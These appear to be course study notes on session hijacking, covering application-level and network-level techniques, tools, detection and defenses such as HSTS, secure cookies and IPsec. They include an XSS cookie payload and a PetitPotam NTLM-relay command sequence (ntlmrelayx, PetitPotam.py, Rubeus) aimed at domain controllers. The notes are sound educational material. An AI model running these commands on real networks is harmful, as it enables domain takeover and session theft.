# Module 11 – Session Hijacking

> Status: ✅ Reference complete

## 1. Goal
Take over an active session between a user and server by stealing/guessing the **session ID** issued after login. Since authentication only happens at session start, the attacker impersonates the user without logging in → data theft, fraud, MITM, DoS.

**Why it succeeds:** no account lockout for invalid session IDs, weak/predictable session-ID generation, insecure ID storage/transmission, no session timeout, vulnerable TCP/IP (no built-in session security), lack of encryption.

**Process (3 phases):**
1. **Track the connection** — sniff (Wireshark/Nmap), capture TCP sequence/ACK numbers.
2. **Desynchronize** — send null data / RST / SYN to break sync (bad timing → ACK storms expose the attack).
3. **Inject the attacker's packet** — inject data or act as MITM.

Local hijack: sniff → predict the Next Sequence Number (NSN) → inject commands before the real user.

**Types:** *active* (take over the session, often MITM + sequence-number prediction) vs *passive* (silently monitor/sniff creds, then reuse). **OSI levels:** *network-level* (TCP/UDP packets, protocol-focused) and *application-level* (HTTP session IDs/cookies).

**Spoofing vs hijacking:** spoofing = start a *new* fake session (IP spoofing, fake credentials); hijacking = take over an *existing* active session (sequence-number sync). *Blind hijacking* = inject commands without seeing responses. Both fail against encryption/integrity checks/SSL.

## 2. Application-level hijacking
Steal or guess the session ID (cookies, URL, HTTP body). Brute-forcing a small predicted range = **session prediction attack**. Compromise methods:

- **Sniffing** — capture the session ID from unencrypted traffic (Wireshark, Riverbed), replay it before the real user.
- **Predicting the session token** — weak generation. Patterns: *sequential* (1001,1002…), *timestamp-based* (`user123-20240709T1600`), *small token space* (0000–9999 brute force), *no rate-limiting*, *weak PRNG* (seed from system time). Steps: get current ID → brute/predict next → modify cookie/URL/hidden field.
- **MITM** — split the connection (client↔attacker↔server), read/alter/inject.
- **Man-in-the-Browser (MitB)** — Trojan + malicious browser extension alters form data via the DOM (e.g. online banking), shows a fake receipt. Works despite SSL/PKI/2FA.
- **Client-side attacks:**
  - **XSS** — inject a script that steals cookies: `<SCRIPT>alert(document.cookie);</SCRIPT>`.
  - Malicious JavaScript, Trojans changing browser proxy settings.
  - **CSRF** — trick the user's browser into submitting an authenticated request to a trusted site (tricks the site, not the user).
- **Session replay** — capture the auth token by eavesdropping, replay it to the server.
- **Session fixation** — set a known session ID in the victim's browser *before* login (URL arg / hidden field / cookie). Phases: set-up → fixation → entrance. If the server reuses the fixed ID after login, attacker rides the same session.
- **Proxy servers** — lure the victim to a link that routes through the attacker's proxy, capturing session info.
- **CRIME** (Compression Ratio Info-leak Made Easy) — exploit TLS/SPDY compression; analyze compressed cookie length to guess the cookie. CrimeCheck tests for it.
- **Forbidden attack** — reused TLS nonce (AES-GCM) lets the attacker derive session keys and inject content.
- **Session donation** — attacker gives the victim *their own* session ID so the victim's entered data ties to the attacker's account.

## 3. Network-level hijacking
Exploit transport/internet protocols; no app code or victim-device access needed. Types: blind, UDP, TCP/IP, RST, MITM packet sniffer, IP spoofing (source-routed).

**Three-way handshake:** SYN → SYN-ACK (server ISN) → ACK. Session identified by IP + port + sequence numbers (seq numbers change, so guessing them is the hard part). If the attacker predicts the next seq/ACK, they spoof the source and inject.

- **TCP/IP hijacking** — sniff, spoof the victim's IP with the predicted seq number; receiver ACKs the victim (who ignores it), desyncing the real connection → attacker takes over while the victim's connection hangs. (Local: send the next expected seq number first; server syncs to attacker, drops victim's "duplicate" packets.)
- **IP spoofing: source-routed packets** — spoof a trusted host's IP, use source routing to control the packet path, adjust seq/ACK to match the server.
- **RST hijacking** — spoofed RST packet (correct ACK number) forcibly closes a connection (Colasoft Packet Builder, tcpdump).
- **Blind hijacking** — inject commands by guessing the ISN without seeing responses.
- **UDP hijacking** — connectionless, easier: send a forged reply before the real server (block the real reply via sniffing/MITM).
- **MITM via forged ICMP & ARP spoofing** — reroute traffic through the attacker (forged ICMP error messages / fake ARP replies updating the victim's ARP table).
- **PetitPotam** — coerce a DC to authenticate to the attacker via MS-EFSRPC, relay NTLM to AD CS → certificate → domain admin.
  ```bash
  certutil.exe                                     # find the CA supporting web enrollment
  ntlmrelayx.py -t http://<CA-IP>/certsrv/ -smb2support --adcs --template DomainController
  python3 PetitPotam.py -d <domain.local> -u <user> -p <pass> <attacker-ip> <dc-ip>   # coerce auth
  python3 PetitPotam.py <attacker-ip> <dc-ip>      # anonymous trigger (if vulnerable)
  Rubeus.exe asktgt /dc:<dc-ip> /domain:<domain.local> /user:<target-user> /ptt /certificate:<hash>
  ```

## 4. Tools
- **Hetty** — HTTP MITM proxy: capture/log/search, replay HTTP requests.
- **Caido** — web security auditing: intercept, wordlist testing, Regex request modification, resend.
- **bettercap** — Go framework for recon/attacks on Wi-Fi, BLE, wireless HID, IPv4/IPv6.
- Also: Burp Suite, OWASP ZAP, WebSploit, sslstrip, JHijack.

## 5. Countermeasures
### Detection
Symptoms: bursts of network activity dropping performance, busy servers from duplicate client+hijacker requests.
- **Manual** — packet sniffers (Wireshark, SteelCentral) + filters.
- **Forced ARP entry** — replace the compromised machine's MAC in the server's ARP cache (on repeated ARP updates, differing MACs, ACK storms).
- **Automatic** — IDS (alert) / IPS (block) on signature match.

### Protection
HTTPS for all sessions; server-generated long random session IDs; session timeouts; never put session IDs in URLs; Secure + HttpOnly + SameSite cookies; MFA; bind session to IP; monitor session activity; educate users to log out; VPN/IPsec for remote access.

**Dev guidelines:** strong random session IDs, regenerate ID after login (stops fixation), HTTPS everywhere, Secure+HttpOnly cookies, expire on logout, short lifespan, IP/User-Agent check, risk-based re-auth, redirect HTTP→HTTPS, no sessions for unauthenticated users.

**User guidelines:** always HTTPS, log out properly, avoid public Wi-Fi for sensitive work, disable auto-connect, clear cookies/history, don't click unknown links, keep browser/OS updated, use AV, incognito on shared devices, don't save passwords in browsers.

**Detection tools:** USM Anywhere, Wireshark, Check Point Quantum IPS, SolarWinds SEM, IBM Security Network IPS, LogRhythm.

### Prevention approaches
- **HSTS** — force HTTPS, auto-upgrade all connections (anti-MITM).
- **Token binding** — device creates a public-private key pair per server; signs the session with its private key → stolen tokens can't be reused.
- **Anti-MITM:** DNS over HTTPS (DoH, port 443), WPA3, VPN, 2FA, password manager, zero-trust, PKI, network segmentation.

### IPsec
Protocol suite for secure IP comms (encryption, authentication, integrity) in VPNs/remote access. Services: replay rejection, confidentiality, access control, connectionless integrity, data-origin auth, data integrity, traffic-flow confidentiality, peer authentication. Protects TCP/UDP/ICMP/BGP at the IP layer.
- **Components:** IPsec driver, IKE (key generation), ISAKMP (encrypted comms setup), Oakley (Diffie-Hellman master+session keys), IPsec Policy Agent.
- **Modes:** *Transport* (encrypt payload only, header visible, end-to-end, NAT-friendly) vs *Tunnel* (encrypt entire packet inside a new IP packet, for gateway/VPN).
- **Protocols:** **AH** (integrity + origin auth + anti-replay, *no encryption*) vs **ESP** (adds encryption/confidentiality + auth/integrity/anti-replay). Use AH for auth only; ESP for encryption + auth. Plus DOI, ISAKMP, Policy.

**Prevention tools:** Checkmarx One SAST, Fiddler (HTTPS decryption/manipulation debugging proxy), Nessus, Invicti, Wapiti.

> Flow: sniff a session (network-level: track → desync → inject; or app-level: steal/predict the session ID) → impersonate the user. Defend by making session IDs unguessable and un-stealable — HTTPS/HSTS everywhere, Secure+HttpOnly+SameSite cookies, regenerate IDs post-login, timeouts, MFA, and IPsec/VPN so sniffed traffic and stolen tokens are useless.
